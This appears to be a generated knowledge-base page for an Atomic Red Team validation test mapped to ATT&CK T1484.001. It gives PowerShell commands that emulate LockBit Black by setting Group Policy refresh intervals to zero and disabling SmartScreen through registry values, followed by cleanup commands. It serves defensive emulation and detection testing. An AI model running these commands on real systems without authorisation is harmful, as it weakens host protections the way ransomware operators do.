---
atomic_guid: "b51eae65-5441-4789-b8e8-64783c26c1d1"
title: "LockBit Black - Modify Group policy settings -Powershell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1484.001"
attack_technique_name: "Domain Policy Modification: Group Policy Modification"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1484.001/T1484.001.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "b51eae65-5441-4789-b8e8-64783c26c1d1"
  - "LockBit Black - Modify Group policy settings -Powershell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

An adversary modifies group policy settings

## ATT&CK Mapping

- [[kb/attack/techniques/T1484-domain_or_tenant_policy_modification#^t1484001-group-policy-modification|T1484.001: Group Policy Modification]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force
```

### Cleanup

```powershell
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore 
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1484.001/T1484.001.yaml)
